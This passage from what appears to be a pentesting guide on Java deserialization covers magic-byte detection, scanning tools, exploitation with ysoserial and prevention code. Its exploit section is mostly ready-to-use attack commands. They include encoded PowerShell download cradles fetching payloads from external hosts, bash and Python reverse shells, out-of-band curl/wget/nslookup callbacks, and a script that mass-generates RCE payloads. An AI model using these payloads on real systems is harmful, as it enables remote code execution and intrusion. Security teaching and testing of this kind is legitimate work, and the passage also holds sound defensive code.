highlighter-rouge">Serializable</code>.</li> </ul> <h4 id="black-box">Black Box</h4> <p>For black box testing, look for specific <strong>signatures or “Magic Bytes”</strong> that denote java serialized objects (originating from <code class="language-plaintext highlighter-rouge">ObjectInputStream</code>):</p> <ul> <li>Hexadecimal pattern: <code class="language-plaintext highlighter-rouge">AC ED 00 05</code>.</li> <li>Base64 pattern: <code class="language-plaintext highlighter-rouge">rO0</code>.</li> <li>HTTP response headers with <code class="language-plaintext highlighter-rouge">Content-type</code> set to <code class="language-plaintext highlighter-rouge">application/x-java-serialized-object</code>.</li> <li>Hexadecimal pattern indicating prior compression: <code class="language-plaintext highlighter-rouge">1F 8B 08 00</code>.</li> <li>Base64 pattern indicating prior compression: <code class="language-plaintext highlighter-rouge">H4sIA</code>.</li> <li>Web files with the <code class="language-plaintext highlighter-rouge">.faces</code> extension and the <code class="language-plaintext highlighter-rouge">faces.ViewState</code> parameter. Discovering these patterns in a web application should prompt an examination as detailed in the <a href="java-jsf-viewstate-.faces-deserialization.md">post about Java JSF ViewState Deserialization</a>.</li> </ul> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
</code></pre></div></div> <h3 id="check-if-vulnerable">Check if vulnerable</h3> <p>If you want to <strong>learn about how does a Java Deserialized exploit work</strong> you should take a look to <a href="basic-java-deserialization-objectinputstream-readobject.md"><strong>Basic Java Deserialization</strong></a>, <a href="java-dns-deserialization-and-gadgetprobe.md"><strong>Java DNS Deserialization</strong></a>, and <a href="java-transformers-to-rutime-exec-payload.md"><strong>CommonsCollection1 Payload</strong></a>.</p> <h4 id="white-box-test">White Box Test</h4> <p>You can check if there is installed any application with known vulnerabilities.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-iname</span> <span class="s2">"*commons*collection*"</span>
<span class="nb">grep</span> <span class="nt">-R</span> InvokeTransformer <span class="nb">.</span>
</code></pre></div></div> <p>You could try to <strong>check all the libraries</strong> known to be vulnerable and that <a href="https://github.com/frohoff/ysoserial"><strong>Ysoserial</strong> </a>can provide an exploit for. Or you could check the libraries indicated on <a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json">Java-Deserialization-Cheat-Sheet</a>.<br/> You could also use <a href="https://github.com/JackOfMostTrades/gadgetinspector"><strong>gadgetinspector</strong></a> to search for possible gadget chains that can be exploited.<br/> When running <strong>gadgetinspector</strong> (after building it) don’t care about the tons of warnings/errors that it’s going through and let it finish. It will write all the findings under <em>gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt</em>. Please, notice that <strong>gadgetinspector won’t create an exploit and it may indicate false positives</strong>.</p> <h4 id="black-box-test">Black Box Test</h4> <p>Using the Burp extension <a href="java-dns-deserialization-and-gadgetprobe.md"><strong>gadgetprobe</strong></a> you can identify <strong>which libraries are available</strong> (and even the versions). With this information it could be <strong>easier to choose a payload</strong> to exploit the vulnerability.<br/> <a href="java-dns-deserialization-and-gadgetprobe.md#gadgetprobe"><strong>Read this to learn more about GadgetProbe</strong></a><strong>.</strong><br/> GadgetProbe is focused on <strong><code class="language-plaintext highlighter-rouge">ObjectInputStream</code> deserializations</strong>.</p> <p>Using Burp extension <a href="java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner"><strong>Java Deserialization Scanner</strong></a> you can <strong>identify vulnerable libraries</strong> exploitable with ysoserial and <strong>exploit</strong> them.<br/> <a href="java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner"><strong>Read this to learn more about Java Deserialization Scanner.</strong></a><br/> Java Deserialization Scanner is focused on <strong><code class="language-plaintext highlighter-rouge">ObjectInputStream</code></strong> deserializations.</p> <p>You can also use <a href="https://github.com/nccgroup/freddy"><strong>Freddy</strong></a> to <strong>detect deserializations</strong> vulnerabilities in <strong>Burp</strong>. This plugin will detect <strong>not only <code class="language-plaintext highlighter-rouge">ObjectInputStream</code></strong> related vulnerabilities but <strong>also</strong> vulns from <strong>Json</strong> an <strong>Yml</strong> deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.<br/> <a href="https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/"><strong>You can find more information about Freddy here.</strong></a></p> <p><strong>Serialization Test</strong></p> <p>Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to <strong>change the data inside the serialized object and bypass some checks</strong> (maybe grant you admin privileges inside a webapp).<br/> If you find a java serialized object being sent to a web application, <strong>you can use</strong> <a href="https://github.com/NickstaDB/SerializationDumper"><strong>SerializationDumper</strong></a> <strong>to print in a more human readable format the serialization object that is sent</strong>. Knowing which data are you sending would be easier to modify it and bypass some checks.</p> <h3 id="exploit"><strong>Exploit</strong></h3> <h4 id="ysoserial"><strong>ysoserial</strong></h4> <p>The main tool to exploit Java deserializations is <a href="https://github.com/frohoff/ysoserial"><strong>ysoserial</strong></a> (<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"><strong>download here</strong></a>). You can also consider using <a href="https://github.com/pimps/ysoserial-modified"><strong>ysoseral-modified</strong></a> which will allow you to use complex commands (with pipes for example).<br/> Note that this tool is <strong>focused</strong> on exploiting <strong><code class="language-plaintext highlighter-rouge">ObjectInputStream</code></strong>.<br/> I would <strong>start using the “URLDNS”</strong> payload <strong>before a RCE</strong> payload to test if the injection is possible. Anyway, note that maybe the “URLDNS” payload is not working but other RCE payload is.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PoC to make the application perform a DNS req</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net <span class="o">&gt;</span> payload

<span class="c"># PoC RCE in Windows</span>
<span class="c"># Ping</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections5 <span class="s1">'cmd /c ping -n 5 127.0.0.1'</span> <span class="o">&gt;</span> payload
<span class="c"># Time, I noticed the response too longer when this was used</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"cmd /c timeout 5"</span> <span class="o">&gt;</span> payload
<span class="c"># Create File</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"cmd /c echo pwned&gt; C:</span><span class="se">\\\\</span><span class="s2">Users</span><span class="se">\\\\</span><span class="s2">username</span><span class="se">\\\\</span><span class="s2">pwn"</span> <span class="o">&gt;</span> payload
<span class="c"># DNS request</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"</span>
<span class="c"># HTTP request (+DNS)</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"</span>
<span class="c">## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')</span>
<span class="c">## To encode something in Base64 for Windows PS from linux you can use: echo -n "&lt;PAYLOAD&gt;" | iconv --to-code UTF-16LE | base64 -w0</span>
<span class="c"># Reverse Shell</span>
<span class="c">## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"</span>

<span class="c">#PoC RCE in Linux</span>
<span class="c"># Ping</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"ping -c 5 192.168.1.4"</span> <span class="o">&gt;</span> payload
<span class="c"># Time</span>
<span class="c">## Using time in bash I didn't notice any difference in the timing of the response</span>
<span class="c"># Create file</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"touch /tmp/pwn"</span> <span class="o">&gt;</span> payload
<span class="c"># DNS request</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"</span>
<span class="c"># HTTP request (+DNS)</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"</span> <span class="o">&gt;</span> payload
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"</span>
<span class="c"># Reverse shell</span>
<span class="c">## Encoded: bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}"</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
<span class="c">## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
java <span class="nt">-jar</span> ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="s2">"bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"</span>

<span class="c"># Base64 encode payload in base64</span>
<span class="nb">base64</span> <span class="nt">-w0</span> payload
</code></pre></div></div> <table> <tbody> <tr> <td>When creating a payload for <strong>java.lang.Runtime.exec()</strong> you <strong>cannot use special characters</strong> like “&gt;” or “</td> <td>” to redirect the output of an execution, “$()” to execute commands or even <strong>pass arguments</strong> to a command separated by <strong>spaces</strong> (you can do <code class="language-plaintext highlighter-rouge">echo -n "hello world"</code> but you can’t do <code class="language-plaintext highlighter-rouge">python2 -c 'print "Hello world"'</code>). In order to encode correctly the payload you could <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">use this webpage</a>.</td> </tr> </tbody> </table> <p>Feel free to use the next script to create <strong>all the possible code execution</strong> payloads for Windows and Linux and then test them on the vulnerable web page:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="c1"># You may need to update the payloads
</span><span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">BeanShell1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Clojure</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsBeanutils1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">CommonsCollections7</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Groovy1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Hibernate1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Hibernate2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">JBossInterceptors1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">JRMPClient</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">JSON1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">JavassistWeld1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Jdk7u21</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">MozillaRhino1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">MozillaRhino2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Myfaces1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Myfaces2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ROME</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Spring1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Spring2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Vaadin1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Wicket1</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
        <span class="n">final</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">REPLACE</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
        <span class="k">print</span> <span class="sh">'</span><span class="s">Generating </span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> for </span><span class="sh">'</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sh">'</span><span class="s">...</span><span class="sh">'</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">java -jar ysoserial.jar </span><span class="sh">'</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> </span><span class="sh">"'</span> <span class="o">+</span> <span class="n">final</span> <span class="o">+</span> <span class="sh">'"'</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="n">command</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">encoded</span> <span class="o">!=</span> <span class="sh">""</span><span class="p">:</span>
            <span class="nf">open</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_intruder.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="n">encoded</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">generate</span><span class="p">(</span><span class="sh">'</span><span class="s">Windows</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ping -n 1 win.REPLACE.server.local</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">generate</span><span class="p">(</span><span class="sh">'</span><span class="s">Linux</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ping -c 1 nix.REPLACE.server.local</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <h4 id="serialkillerbypassgadgets">serialkillerbypassgadgets</h4> <p>You can <strong>use</strong> <a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection"><strong>https://github.com/pwntester/SerialKillerBypassGadgetCollection</strong></a> <strong>along with ysoserial to create more exploits</strong>. More information about this tool in the <strong>slides of the talk</strong> where the tool was presented: <a href="https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1">https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1</a></p> <h4 id="marshalsec">marshalsec</h4> <p><a href="https://github.com/mbechler/marshalsec"><strong>marshalsec</strong> </a>can be used to generate payloads to exploit different <strong>Json</strong> and <strong>Yml</strong> serialization libraries in Java.<br/> In order to compile the project I needed to <strong>add</strong> this <strong>dependencies</strong> to <code class="language-plaintext highlighter-rouge">pom.xml</code>:</p> <pre><code class="language-markup">&lt;dependency&gt;
		&lt;groupId&gt;javax.activation&lt;/groupId&gt;
		&lt;artifactId&gt;activation&lt;/artifactId&gt;
		&lt;version&gt;1.1.1&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
		&lt;groupId&gt;com.sun.jndi&lt;/groupId&gt;
		&lt;artifactId&gt;rmiregistry&lt;/artifactId&gt;
		&lt;version&gt;1.2.1&lt;/version&gt;
		&lt;type&gt;pom&lt;/type&gt;
&lt;/dependency&gt;
</code></pre> <p><strong>Install maven</strong>, and <strong>compile</strong> the project:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>maven
mvn clean package <span class="nt">-DskipTests</span>
</code></pre></div></div> <h4 id="fastjson">FastJSON</h4> <p>Read more about this Java JSON library: <a href="https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html">https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html</a></p> <h3 id="labs">Labs</h3> <ul> <li>If you want to test some ysoserial payloads you can <strong>run this webapp</strong>: <a href="https://github.com/hvqzao/java-deserialize-webapp">https://github.com/hvqzao/java-deserialize-webapp</a></li> <li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li> </ul> <h3 id="why">Why</h3> <p>Java uses a lot serialization for various purposes like:</p> <ul> <li><strong>HTTP requests</strong>: Serialization is widely employed in the management of parameters, ViewState, cookies, etc.</li> <li><strong>RMI (Remote Method Invocation)</strong>: The Java RMI protocol, which relies entirely on serialization, is a cornerstone for remote communication in Java applications.</li> <li><strong>RMI over HTTP</strong>: This method is commonly used by Java-based thick client web applications, utilizing serialization for all object communications.</li> <li><strong>JMX (Java Management Extensions)</strong>: JMX utilizes serialization for transmitting objects over the network.</li> <li><strong>Custom Protocols</strong>: In Java, the standard practice involves the transmission of raw Java objects, which will be demonstrated in upcoming exploit examples.</li> </ul> <h3 id="prevention">Prevention</h3> <h4 id="transient-objects">Transient objects</h4> <p>A class that implements <code class="language-plaintext highlighter-rouge">Serializable</code> can implement as <code class="language-plaintext highlighter-rouge">transient</code> any object inside the class that shouldn’t be serializable. For example:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">myAccount</span> <span class="kd">implements</span> <span class="nc">Serializable</span>
<span class="o">{</span>
    <span class="kd">private</span> <span class="kd">transient</span> <span class="kt">double</span> <span class="n">profit</span><span class="o">;</span> <span class="c1">// declared transient</span>
    <span class="kd">private</span> <span class="kd">transient</span> <span class="kt">double</span> <span class="n">margin</span><span class="o">;</span> <span class="c1">// declared transient</span>
</code></pre></div></div> <h4 id="avoid-serialization-of-a-class-that-need-to-implements-serializable">Avoid Serialization of a class that need to implements Serializable</h4> <p>In scenarios where certain <strong>objects must implement the <code class="language-plaintext highlighter-rouge">Serializable</code></strong> interface due to class hierarchy, there’s a risk of unintentional deserialization. To prevent this, ensure these objects are non-deserializable by defining a <code class="language-plaintext highlighter-rouge">final</code> <code class="language-plaintext highlighter-rouge">readObject()</code> method that consistently throws an exception, as shown below:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="nc">ObjectInputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">(</span><span class="s">"Cannot be deserialized"</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div> <h4 id="enhancing-deserialization-security-in-java"><strong>Enhancing Deserialization Security in Java</strong></h4> <p><strong>Customizing <code class="language-plaintext highlighter-rouge">java.io.ObjectInputStream</code></strong> is a practical approach for securing deserialization processes. This method is suitable when:</p> <ul> <li>The deserialization code is under your control.</li> <li>The classes expected for deserialization are known.</li> </ul> <p>Override the <strong><code class="language-plaintext highlighter-rouge">resolveClass()</code></strong> method to limit deserialization to allowed classes only. This prevents deserialization of any class except those explicitly permitted, such as in the following example that restricts deserialization to the <code class="language-plaintext highlighter-rouge">Bicycle</code> class only:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LookAheadObjectInputStream</span> <span class="kd">extends</span> <span class="nc">ObjectInputStream</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="nf">LookAheadObjectInputStream</span><span class="o">(</span><span class="nc">InputStream</span> <span class="n">inputStream</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="cm">/**
    * Only deserialize instances of our expected Bicycle class
    */</span>
    <span class="nd">@Override</span>
    <span class="kd">protected</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="nc">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="nc">Bicycle</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">InvalidClassException</span><span class="o">(</span><span class="s">"Unauthorized deserialization attempt"</span><span class="o">,</span> <span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div> <p><strong>Using a Java Agent for Security Enhancement</strong> offers a fallback solution when code modification isn’t possible. This method applies mainly for <strong>blacklisting harmful classes</strong>, using a JVM parameter:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-javaagent:name-of-agent.jar
</code></pre></div></div> <p>It provides a way to secure deserialization dynamically, ideal for environments where immediate code changes are impractical.</p> <p>Check and example in <a href="https://github.com/Contrast-Security-OSS/contrast-rO0">rO0 by Contrast Security</a></p> <p><strong>Implementing Serialization Filters</strong>: Java 9 introduced serialization filters via the <strong><code class="language-plaintext highlighter-rouge">ObjectInputFilter</code></strong> interface, providing a powerful mechanism for specifying criteria that serialized objects must meet before being deserialized. These filters can be applied globally or per stream, offering a granular control over the deserialization process.</p> <p>To utilize serialization filters, you can set a global filter that applies to all deserialization operations or configure it dynamically for specific streams. For example:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ObjectInputFilter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">info</span> <span class="o">-&gt;</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">depth</span><span class="o">()</span> <span class="o">&gt;</span> <span class="no">MAX_DEPTH</span><span class="o">)</span> <span class="k">return</span> <span class="nc">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span> <span class="c1">// Limit object graph depth</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">references</span><span class="o">()</span> <span class="o">&gt;</span> <span class="no">MAX_REFERENCES</span><span class="o">)</span> <span class="k">return</span> <span class="nc">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span> <span class="c1">// Limit references</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">serialClass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">allowedClasses</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">serialClass</span><span class="o">().</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
        <span class="k">return</span> <span class="nc">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span> <span class="c1">// Restrict to allowed classes</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="nc">Status</span><span class="o">.</span><span class="na">ALLOWED</span><span class="o">;</span>
<span class="o">};</span>
<span class="nc">ObjectInputFilter</span><span class="o">.</span><span class="na">Config</span><span class="o">.</span><span class="na">setSerialFilter</span><span class="o">(</span><span class="n">filter</span><span class="o">);</span>
</code></pre></div></div> <p><strong>Leveraging External Libraries for Enhanced Security</strong>: Libraries such as <strong>NotSoSerial</strong>, <strong>jdeserialize</strong>, and <strong>Kryo</strong> offer advanced features for controlling and monitoring Java deserialization. These libraries can provide additional layers of security, such as whitelisting or blacklisting classes, analyzing serialized objects before deserialization, and implementing custom serialization strategies.</p> <ul> <li><strong>NotSoSerial</strong> intercepts deserialization processes to prevent execution of untrusted code.</li> <li><strong>jdeserialize</strong> allows for the analysis of serialized Java objects without deserializing them, helping identify potentially malicious content.</li> <li><strong>Kryo</strong> is an alternative serialization framework that emphasizes speed and efficiency, offering configurable serialization strategies that can enhance security.</li> </ul> <h3 id="references">References</h3> <ul> <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</a></li> <li>Deserialization and ysoserial talk: <a href="http://frohoff.github.io/appseccali-marshalling-pickles/">http://frohoff.github.io/appseccali-marshalling-pickles/</a></li> <li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li> <li><a href="https://www.youtube.com/watch?v=VviY3O-euVQ">https://www.youtube.com/watch?v=VviY3O-euVQ</a></li> <li>Talk about gadgetinspector: <a href="https://www.youtube.com/watch?v=wPbW6zQ52w8">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> and slides: <a 